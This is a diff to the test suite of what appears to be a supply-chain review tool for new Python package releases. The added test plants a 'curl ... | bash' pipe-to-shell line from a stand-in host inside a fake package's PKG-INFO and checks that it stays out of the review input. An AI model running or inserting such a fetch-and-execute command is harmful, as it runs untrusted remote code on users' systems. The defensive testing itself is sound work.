@@ -248,10 +248,33 @@ def test_new_package_surface_keeps_the_metadata_the_execution_context_reads(monk
         "brandnew/cli.py": b"def main(): pass\n",
         "brandnew.egg-info/entry_points.txt": b"[console_scripts]\nbn = brandnew.cli:main\n\n[pytest11]\nbn = brandnew.plug\n",
         "brandnew.egg-info/top_level.txt": b"brandnew\n",
-        "brandnew.egg-info/SOURCES.txt": b"x\n"}))
+        "brandnew.egg-info/SOURCES.txt": b"x\n",
+        "vendor/other.egg-info/entry_points.txt": b"[console_scripts]\nv = v:main\n"}))
     art = fetcher.fetch_artifacts(Config(), NewRelease("brandnew", "1.0", 5))   # default policy=surface
-    assert set(art.new_files) == {"setup.py", "PKG-INFO", "brandnew/__init__.py",
+    assert set(art.new_files) == {"setup.py", "brandnew/__init__.py",           # no PKG-INFO: nothing reads it
                                   "brandnew.egg-info/entry_points.txt", "brandnew.egg-info/top_level.txt"}
     ctx = differ.build_diff(art).exec_context
     assert "bn -> brandnew.cli:main" in ctx and "pytest11: bn -> brandnew.plug" in ctx
     assert "top_level.txt=brandnew" in ctx
+
+
+def test_a_large_pkg_info_never_crowds_setup_py_out_of_a_first_release_review(monkeypatch):
+    # PKG-INFO's body is the whole README (up to ~1 MB), in two copies; the block never reads it, and it sorts
+    # before setup.py / pyproject.toml, so it must stay out of the surface or it cuts them from the input.
+    from pydiffwatch import differ, reviewer
+    from pydiffwatch.models import TriageResult
+    pkginfo = (b"Metadata-Version: 2.1\nName: brandnew\n\n# brandnew\ncurl -sSL https://example.invalid/i.sh | bash\n"
+               + (b"x" * 150 + b"\n") * 1200)
+    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("brandnew", [
+        ("1.0", "2026-01-01T00:00:00Z")]))
+    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: make_sdist({
+        "PKG-INFO": pkginfo, "brandnew.egg-info/PKG-INFO": pkginfo,
+        "setup.py": b"from setuptools import setup\nsetup(name='brandnew')\n",
+        "pyproject.toml": b"[build-system]\nrequires=['setuptools']\nbuild-backend='setuptools.build_meta'\n",
+        "brandnew/__init__.py": b"__version__ = '1.0'\n"}))
+    art = fetcher.fetch_artifacts(Config(), NewRelease("brandnew", "1.0", 5))
+    text = reviewer.build_review_input(differ.build_diff(art), TriageResult(50.0, [], True),
+                                       max_chars=Config().reviewer.max_input_chars)
+    lines = text.split("\n")
+    assert "--- file: setup.py (added) ---" in lines and "--- file: pyproject.toml (added) ---" in lines
+    assert "PKG-INFO" not in text and "curl -sSL" not in text
